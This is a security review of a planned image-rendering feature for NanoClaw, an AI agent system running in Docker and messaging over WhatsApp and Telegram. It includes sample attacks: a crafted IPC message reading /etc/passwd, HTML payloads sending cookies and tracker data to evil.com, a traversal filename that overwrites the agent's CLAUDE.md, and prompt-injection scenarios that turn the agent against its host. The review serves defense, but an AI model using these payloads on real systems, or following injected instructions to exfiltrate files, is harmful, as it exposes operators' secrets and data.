# Security Review: NanoClaw Media Implementation Plan

**Reviewer:** Security Engineer
**Date:** 2026-02-19
**Scope:** `docs/nanoclaw-media-plan.md` — HTML-to-PNG rendering and image sending via WhatsApp/Telegram
**Methodology:** Threat-model analysis of proposed changes against existing NanoClaw codebase

---

## Summary

The plan introduces a significant new attack surface: a Chromium browser rendering arbitrary HTML strings inside the Docker container. The HTML content is generated by the AI agent from user-controlled data (tracker.csv, week files, task names). The existing codebase has solid IPC authorization and mount security, but the proposed changes have several gaps that range from medium to high severity.

Total findings: 10
- Critical: 1
- High: 3
- Medium: 4
- Low: 2

---

## Finding 1: Path Traversal via `image_path` in `send_image` MCP Tool

**Severity:** CRITICAL (CVSS 8.6)
**Component:** `container/agent-runner/src/ipc-mcp-stdio.ts` (proposed `send_image` tool)
**Status:** New vulnerability introduced by this plan

### Description

The proposed `send_image` MCP tool accepts an `image_path` parameter and writes it directly into the IPC JSON message. On the host side, the proposed IPC handler in `ipc.ts` calls `fs.readFileSync(msg.imagePath)` with no validation.

```typescript
// Proposed IPC handler (ipc.ts)
case 'image': {
  const imageBuffer = fs.readFileSync(msg.imagePath);  // UNVALIDATED PATH
  await channel.sendImage(msg.chatJid, imageBuffer, msg.caption);
  fs.unlinkSync(msg.imagePath);  // DELETES THE FILE
  break;
}
```

The `imagePath` value originates from inside the container's IPC directory but is resolved on the **host** filesystem. A container agent (or a prompt-injected agent) could craft:

```json
{
  "type": "image",
  "imagePath": "/etc/passwd",
  "chatJid": "attacker@g.us",
  "caption": "exfil"
}
```

Or worse: `"imagePath": "/Users/k2/.config/nanoclaw/mount-allowlist.json"` — reading and then **deleting** security configuration via the `fs.unlinkSync` call.

### Attack Scenario

1. Attacker sends a crafted message to a WhatsApp group that triggers the agent.
2. Agent is prompt-injected to call `send_image` with `image_path: "/etc/shadow"` or any sensitive host path.
3. Host reads the file and sends it as an image to the attacker's chat.
4. Host then deletes the original file.

### Impact

- Arbitrary file read from the host filesystem (confidentiality breach).
- Arbitrary file deletion from the host filesystem (availability/integrity breach).
- Exfiltration of secrets, SSH keys, API tokens, mount allowlist, etc.

### Recommendation

1. **Validate that `imagePath` is within the expected IPC media directory** before reading:
   ```typescript
   const expectedPrefix = path.join(DATA_DIR, 'ipc', sourceGroup, 'media');
   const realPath = fs.realpathSync(msg.imagePath);
   if (!realPath.startsWith(expectedPrefix)) {
     logger.warn({ imagePath: msg.imagePath, sourceGroup }, 'Path traversal attempt blocked');
     break;
   }
   ```
2. **Use `fs.realpathSync`** to resolve symlinks before the prefix check (prevents symlink bypass).
3. Inside the container, the `send_image` MCP tool should also constrain `image_path` to `/workspace/ipc/media/`:
   ```typescript
   if (!image_path.startsWith('/workspace/ipc/media/')) {
     return { content: [{ type: 'text', text: 'image_path must be in /workspace/ipc/media/' }], isError: true };
   }
   ```
4. The `filename` parameter in `render_image` should be sanitized to reject path separators (`/`, `..`).

---

## Finding 2: HTML Injection / Stored XSS via Template Data

**Severity:** HIGH (CVSS 7.5)
**Component:** `cascade/templates/cards/*.html`, `cascade-media.md` skill
**Status:** New vulnerability introduced by this plan

### Description

The plan uses placeholder token replacement (`{{CORE_COMPLETION}}`, `{{HIGHLIGHTS}}`, `{{COACHING_LINE}}`) where the agent injects data from `tracker.csv` and `week-*.md` files into HTML templates via string interpolation. These data sources contain user-written text (task names, notes, coaching lines).

If a user logs a note like:
```
sent email to <script>fetch('https://evil.com/'+document.cookie)</script> client
```

Or a task name contains:
```
Review <img src=x onerror="..."> proposal
```

This HTML will be rendered by Puppeteer. While there is no persistent browser session (so no cookies to steal), Puppeteer executes in a context that has:
- Access to `file://` protocol (can read local container files)
- Network access (can exfiltrate data to external hosts)

### Attack Scenario

1. User (or attacker in a shared group) logs a note containing `<img src="https://evil.com/exfil?data=TRACKER_CONTENTS">`.
2. Agent reads tracker.csv, injects the note into an HTML template.
3. Puppeteer renders the HTML, triggering the image load, which exfiltrates data to `evil.com`.
4. More sophisticated: `<script>` tags can read other files mounted in the container and exfiltrate them.

### Impact

- JavaScript execution inside the container's Chromium process.
- Potential data exfiltration from mounted volumes via network requests.
- Container file reads via `file://` protocol.

### Recommendation

1. **HTML-escape all template values** before injection. Create a utility:
   ```typescript
   function escapeHtml(str: string): string {
     return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
              .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
   }
   ```
   Note: The existing `escapeXml` function in `router.ts` does exactly this — reuse or extract it.
2. **Disable JavaScript in Puppeteer** for template rendering:
   ```typescript
   await page.setJavaScriptEnabled(false);
   ```
   This eliminates script injection entirely. Templates should be pure CSS — no JS needed.
3. **Block network access** in the Puppeteer page:
   ```typescript
   await page.setRequestInterception(true);
   page.on('request', (req) => {
     if (req.url().startsWith('data:') || req.url().startsWith('file:')) {
       // Allow data: URIs for inline fonts, block file:// reads
       if (req.url().startsWith('data:')) req.continue();
       else req.abort();
     } else {
       req.abort(); // Block all network requests
     }
   });
   ```
4. The `cascade-media.md` skill definition should explicitly instruct the agent to escape values before injecting them into templates.

---

## Finding 3: Resource Exhaustion via Oversized HTML (Puppeteer OOM)

**Severity:** HIGH (CVSS 7.0)
**Component:** `container/agent-runner/src/ipc-mcp-stdio.ts` (proposed `render_image` tool)
**Status:** New vulnerability introduced by this plan

### Description

The `render_image` MCP tool accepts an arbitrary `html` string with no size limit. An agent (or a prompt-injected agent) could pass a multi-megabyte HTML string that causes Puppeteer/Chromium to consume all available memory, leading to OOM kill of the container or degraded host performance.

The proposed handler:
```typescript
handler: async ({ html, width = 1200, height = 800, filename = 'rendered.png' }) => {
  // No size check on html
  await page.setContent(html, { waitUntil: 'domcontentloaded' });
  // No timeout on screenshot
  await page.screenshot({ path: outputPath, type: 'png', optimizeForSpeed: true });
}
```

Additionally, `width` and `height` are unbounded. Setting `width: 100000, height: 100000` with `deviceScaleFactor: 2` would attempt to allocate a 200000x200000 pixel buffer (~150 GB).

### Attack Scenario

1. Agent receives a prompt-injection payload that calls `render_image` with 10MB of nested `<div>` elements or a 50000x50000 viewport.
2. Chromium attempts to allocate the buffer, consuming all container memory.
3. Container OOM-kills, disrupting all scheduled tasks and active conversations for that group.
4. If Docker memory limits aren't set, host system memory is affected.

### Impact

- Denial of service against the NanoClaw container.
- Potential host memory pressure if Docker isn't memory-limited.

### Recommendation

1. **Limit HTML size** in the `render_image` handler:
   ```typescript
   const MAX_HTML_SIZE = 512 * 1024; // 512 KB — generous for any status card
   if (html.length > MAX_HTML_SIZE) {
     return { content: [{ type: 'text', text: `HTML too large: ${html.length} bytes (max ${MAX_HTML_SIZE})` }], isError: true };
   }
   ```
2. **Clamp viewport dimensions**:
   ```typescript
   const clampedWidth = Math.min(Math.max(width, 200), 2400);
   const clampedHeight = Math.min(Math.max(height, 200), 2000);
   ```
3. **Add a timeout to the screenshot operation**:
   ```typescript
   const RENDER_TIMEOUT = 10000; // 10 seconds
   await Promise.race([
     page.screenshot({ path: outputPath, type: 'png', optimizeForSpeed: true }),
     new Promise((_, reject) => setTimeout(() => reject(new Error('Render timeout')), RENDER_TIMEOUT)),
   ]);
   ```
4. **Set Docker memory limits** on the container (`--memory=1g` in container args) — this is already missing from `buildContainerArgs`.

---

## Finding 4: Puppeteer `--no-sandbox` Escalation Risk

**Severity:** HIGH (CVSS 7.0)
**Component:** `container/Dockerfile`, proposed browser initialization
**Status:** New risk introduced by this plan (existing Chromium is for agent-browser, not attacker-controlled HTML)

### Description

The proposed browser initialization uses:
```typescript
args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
```

`--no-sandbox` disables Chromium's process sandbox. The existing Chromium in the container is used for `agent-browser` (navigating external websites under agent control), where the risk is lower because the agent chooses which URLs to visit.

The new use case is fundamentally different: Puppeteer now renders **user-data-influenced HTML**. If an attacker achieves script execution in the rendered page (see Finding 2), the lack of sandbox means:
- The script runs with the full privileges of the `node` user inside the container.
- It can read/write to all mounted volumes (`/workspace/group`, `/workspace/ipc`, etc.).
- It can write IPC messages directly, bypassing MCP tool validation.

### Attack Scenario

1. Attacker injects `<script>` into a template value (via tracker.csv note).
2. Script executes in unsandboxed Chromium.
3. Script writes a malicious IPC file to `/workspace/ipc/messages/` — e.g., registering a new group or scheduling a task.
4. Host IPC watcher picks up the file and executes the action.

### Impact

- Privilege escalation from rendered HTML content to IPC command execution.
- Bypass of MCP tool-level authorization.

### Recommendation

1. **Disable JavaScript in Puppeteer** (see Finding 2) — this is the primary mitigation.
2. **Consider using Satori + resvg** for template rendering instead of Puppeteer. The plan mentions this as a "future iteration" alternative, but it eliminates the entire Chromium attack surface. For simple status cards with known layouts, Satori is both faster (10-50ms vs 200-800ms) and dramatically safer.
3. If Puppeteer must be used, **run it as a separate restricted user** inside the container, with read-only access to `/workspace/ipc/`.
4. Document that `--no-sandbox` is a known risk and the mitigation is disabled JavaScript. If JavaScript is somehow re-enabled, this becomes Critical.

---

## Finding 5: Temp File Cleanup Failures — Disk Exhaustion

**Severity:** MEDIUM (CVSS 5.3)
**Component:** `ipc.ts` (proposed image handler), `ipc-mcp-stdio.ts` (proposed `render_image`)
**Status:** New vulnerability introduced by this plan

### Description

The plan generates PNG files in `/workspace/ipc/media/` and relies on the host to delete them after sending:

```typescript
// Host cleanup
fs.unlinkSync(msg.imagePath);
```

Several failure modes leave PNG files behind:
- If `channel.sendImage()` throws, the `unlinkSync` never runs (no try/finally pattern).
- If the host crashes between reading and deleting, the file persists.
- If the IPC JSON file fails to parse, the image file it references is orphaned.
- The `render_image` tool generates files but `send_image` might never be called (agent error, timeout, etc.).

Over time, orphaned PNGs accumulate. At `deviceScaleFactor: 2` and 1200x800, each PNG is roughly 200-500KB. Thousands of renders could consume hundreds of MB.

### Impact

- Gradual disk exhaustion in the IPC mount directory.
- Eventual container or host disk space issues.

### Recommendation

1. **Wrap the image handler in try/finally**:
   ```typescript
   case 'image': {
     try {
       const imageBuffer = fs.readFileSync(msg.imagePath);
       await channel.sendImage(msg.chatJid, imageBuffer, msg.caption);
     } finally {
       try { fs.unlinkSync(msg.imagePath); } catch {}
     }
     break;
   }
   ```
2. **Add a periodic cleanup job** that deletes PNG files in `media/` older than 1 hour:
   ```typescript
   // Run every 30 minutes
   setInterval(() => cleanupOldMedia(path.join(ipcBaseDir, '*/media'), 3600000), 1800000);
   ```
3. **Set a maximum file count** in the `render_image` handler — refuse to render if there are already more than 50 PNGs in the media directory.

---

## Finding 6: IPC `type: "image"` Missing Authorization Check

**Severity:** MEDIUM (CVSS 6.5)
**Component:** `src/ipc.ts` (proposed image handler)
**Status:** New vulnerability introduced by this plan

### Description

The existing `type: "message"` handler in `ipc.ts` (line 75-101) includes authorization checks:

```typescript
if (data.type === 'message' && data.chatJid && data.text) {
  const targetGroup = registeredGroups[data.chatJid];
  if (isMain || (targetGroup && targetGroup.folder === sourceGroup)) {
    // authorized — send
  }
}
```

The proposed `type: "image"` handler in the plan does NOT include this authorization check:

```typescript
case 'image': {
  const imageBuffer = fs.readFileSync(msg.imagePath);
  await channel.sendImage(msg.chatJid, imageBuffer, msg.caption);
  // NO AUTHORIZATION CHECK — any group can send to any chatJid
}
```

This means a non-main group container could send images to any registered chat, bypassing the per-group IPC namespace authorization that exists for text messages.

### Impact

- Cross-group message sending — a compromised non-main container can spam or phish other groups.
- Violates the existing security model where non-main groups can only send to their own chatJid.

### Recommendation

Apply the same authorization check used for `type: "message"`:
```typescript
case 'image': {
  const targetGroup = registeredGroups[msg.chatJid];
  if (!isMain && (!targetGroup || targetGroup.folder !== sourceGroup)) {
    logger.warn({ chatJid: msg.chatJid, sourceGroup }, 'Unauthorized IPC image attempt blocked');
    break;
  }
  // ... proceed with sending
}
```

---

## Finding 7: `filename` Parameter Injection in `render_image`

**Severity:** MEDIUM (CVSS 5.5)
**Component:** `container/agent-runner/src/ipc-mcp-stdio.ts` (proposed `render_image` tool)
**Status:** New vulnerability introduced by this plan

### Description

The `render_image` tool constructs a file path using user-controlled `filename`:

```typescript
const outputPath = `/workspace/ipc/media/${filename}`;
await page.screenshot({ path: outputPath, ... });
```

If `filename` contains path traversal characters (e.g., `../../group/CLAUDE.md`), Puppeteer will write the PNG to an arbitrary path within the container. This could overwrite:
- IPC message files in `/workspace/ipc/messages/` (injecting commands)
- Configuration files in `/workspace/group/`
- Session data in `/home/node/.claude/`

### Attack Scenario

1. Prompt-injected agent calls `render_image` with `filename: "../../messages/inject.json"`.
2. While the file will be a PNG (not valid JSON), it creates a file in the messages directory that the host IPC watcher tries to parse.
3. More targeted: `filename: "../../group/CLAUDE.md"` overwrites the agent's system prompt for the next session.

### Impact

- Arbitrary file write within the container (limited to Puppeteer's output path).
- Potential IPC injection or configuration tampering.

### Recommendation

Sanitize the filename to remove path components:
```typescript
const safeName = path.basename(filename).replace(/[^a-zA-Z0-9._-]/g, '_');
if (!safeName.endsWith('.png')) safeName += '.png';
const outputPath = `/workspace/ipc/media/${safeName}`;
```

---

## Finding 8: Data Exfiltration via Image Rendering

**Severity:** MEDIUM (CVSS 6.0)
**Component:** Architectural — the skill definition + agent behavior
**Status:** Inherent risk of the feature design

### Description

The `cascade-media` skill instructs the agent to read sensitive data files (`tracker.csv`, `week-*.md`, monthly targets) and render them into PNG images that are sent over WhatsApp/Telegram. This is the intended behavior. However, a prompt-injected agent could:

1. Read files beyond the intended scope (e.g., `/workspace/project/.env`, session data, other groups' files in the main container).
2. Render them into an "innocent-looking" status card.
3. Send them to the chat.

The existing text channel already has this risk (the agent can read and send file contents as text), but images are harder to detect and monitor — a status card PNG containing exfiltrated data would look normal at a glance.

### Existing Mitigations

- Non-main containers have limited mounts (only their own group folder + read-only global).
- The main container has broader access but is trusted.
- The mount security module blocks sensitive paths (`.ssh`, `.env`, etc.).

### Impact

- Sensitive data rendered into images and sent to group chats.
- Harder to audit than text-based exfiltration.

### Recommendation

1. This is primarily a prompt-injection risk — ensure the agent's system prompt has strong guardrails against reading files outside the expected data paths.
2. **Log rendered HTML** (or at least a hash of it) so that security audits can reconstruct what was rendered.
3. Consider adding a `max renders per hour` rate limit in the MCP tool to slow down automated exfiltration.
4. The skill definition should explicitly list the only files the agent should read for card generation.

---

## Finding 9: Supply Chain Risk — `puppeteer-core`

**Severity:** LOW (CVSS 3.0)
**Component:** `container/Dockerfile` (proposed dependency addition)
**Status:** New dependency

### Description

The plan adds `puppeteer-core` (~3 MB) as a new npm dependency inside the container. The container already installs Chromium and `agent-browser` (which likely uses puppeteer-core internally). Adding it again in the container's `package.json` creates:

- A second copy that could drift from the version `agent-browser` uses.
- A broader attack surface if `puppeteer-core` or its transitive dependencies are compromised.

The plan also shows `RUN npm install puppeteer` in the Dockerfile addition (not `puppeteer-core`), which contradicts the Dependencies section that says to use `puppeteer-core`. Full `puppeteer` would download a second Chromium binary (~200MB), wasting space and widening the supply chain surface.

### Impact

- Low probability but high impact if `puppeteer-core` npm package is compromised.
- Inconsistency between plan sections (puppeteer vs puppeteer-core) could lead to wrong package being installed.

### Recommendation

1. **Use `puppeteer-core` only** (not `puppeteer`). Fix the Dockerfile section to match:
   ```dockerfile
   RUN npm install puppeteer-core
   ```
2. Pin the version explicitly in `package.json` (e.g., `"puppeteer-core": "24.2.0"`).
3. Verify that `agent-browser` already bundles puppeteer-core. If so, consider reusing its installation instead of adding a duplicate.
4. Run `npm audit` on the container's dependencies after adding the package.

---

## Finding 10: Missing Rate Limiting on Render and Send Operations

**Severity:** LOW (CVSS 3.5)
**Component:** `container/agent-runner/src/ipc-mcp-stdio.ts` (proposed MCP tools)
**Status:** Missing safeguard

### Description

Neither `render_image` nor `send_image` has any rate limiting. An agent in a loop (intentional or via prompt injection) could:

- Call `render_image` hundreds of times, spawning new Puppeteer pages and consuming CPU/memory.
- Call `send_image` hundreds of times, flooding the WhatsApp/Telegram chat and potentially triggering platform-level bans (WhatsApp is particularly aggressive about spam detection — accounts can be permanently banned).

### Impact

- Resource exhaustion inside the container (CPU, memory, disk).
- WhatsApp account ban due to message flooding (platform TOS violation).
- Telegram rate limiting (429 errors, temporary bot restriction).

### Recommendation

1. **Add a simple in-memory rate limiter** to both tools:
   ```typescript
   const renderTimestamps: number[] = [];
   const MAX_RENDERS_PER_MINUTE = 10;

   // In render_image handler:
   const now = Date.now();
   renderTimestamps.push(now);
   while (renderTimestamps.length > 0 && renderTimestamps[0] < now - 60000) {
     renderTimestamps.shift();
   }
   if (renderTimestamps.length > MAX_RENDERS_PER_MINUTE) {
     return { content: [{ type: 'text', text: 'Rate limit: max 10 renders per minute' }], isError: true };
   }
   ```
2. Apply the same pattern to `send_image` with a lower limit (e.g., 5 per minute).
3. Document the rate limits in the `cascade-media` skill so the agent knows to batch operations.

---

## Pre-existing Observations (Not Introduced by This Plan)

These are not new vulnerabilities but are worth noting as they interact with the proposed changes:

### Secrets via Stdin

The existing `container-runner.ts` passes `CLAUDE_CODE_OAUTH_TOKEN` and `ANTHROPIC_API_KEY` via stdin, then deletes them from the input object. This is good practice. The proposed changes don't affect this flow. However, if the Puppeteer browser has network access, a prompt-injected agent could theoretically extract these from the process environment and exfiltrate them via a rendered page's `<script>` (mitigated by disabling JS, see Finding 2).

### IPC Polling Model

The existing IPC watcher polls for JSON files every 1 second. This is a race condition surface (TOCTOU between reading and deleting), but the impact is low because the same message might be sent twice. The image handler inherits this pattern and could theoretically send the same image twice, but this is a minor UX issue, not a security vulnerability.

---

## Recommended Implementation Priority

Before writing any code, address these in order:

| Priority | Finding | Fix Effort |
|----------|---------|-----------|
| 1 (Block) | #1 Path traversal in imagePath | ~20 lines (path validation on host + container) |
| 2 (Block) | #2 HTML injection in templates | ~10 lines (escapeHtml + disable JS in Puppeteer) |
| 3 (Block) | #6 Missing auth check on image IPC | ~10 lines (copy existing auth pattern) |
| 4 (Before merge) | #3 Resource limits on render | ~15 lines (size limits, viewport clamps, timeout) |
| 5 (Before merge) | #4 no-sandbox + JS mitigation | ~3 lines (setJavaScriptEnabled(false)) |
| 6 (Before merge) | #7 Filename sanitization | ~5 lines (path.basename + char filter) |
| 7 (Before merge) | #5 Temp file cleanup | ~20 lines (try/finally + periodic cleanup) |
| 8 (Should fix) | #10 Rate limiting | ~20 lines per tool |
| 9 (Should fix) | #8 Exfiltration logging | ~10 lines (log HTML hash) |
| 10 (Verify) | #9 Supply chain | ~5 min (verify package name, pin version) |

Findings #1, #2, and #6 are **blockers** — they should be addressed in the implementation plan before any code is written. The others should be included in the implementation but are not showstoppers for the design.

---

## Positive Security Notes

The existing NanoClaw codebase has several strong security properties that the new feature should maintain:

1. **Per-group IPC namespaces** — containers can only write to their own IPC directory. The plan correctly uses the existing IPC path (`/workspace/ipc/media/`).
2. **Mount security module** — the external allowlist at `~/.config/nanoclaw/mount-allowlist.json` is not accessible from containers. This is excellent.
3. **Authorization checks on IPC messages** — the `isMain || sourceGroup === targetFolder` pattern is well-implemented for text messages. It just needs to be copied to image messages.
4. **Secrets via stdin** — credentials never touch disk or environment variables visible to child processes.
5. **Non-root container user** — the Dockerfile switches to `node` user, limiting the blast radius of a container escape.
6. **Atomic IPC writes** — the `writeIpcFile` function uses temp file + rename, preventing partial reads.
7. **Container output size limits** — `CONTAINER_MAX_OUTPUT_SIZE` prevents unbounded stdout accumulation.

The plan's architecture (render inside container, send via IPC to host) is fundamentally sound. The issues identified are implementation-level gaps, not architectural flaws.
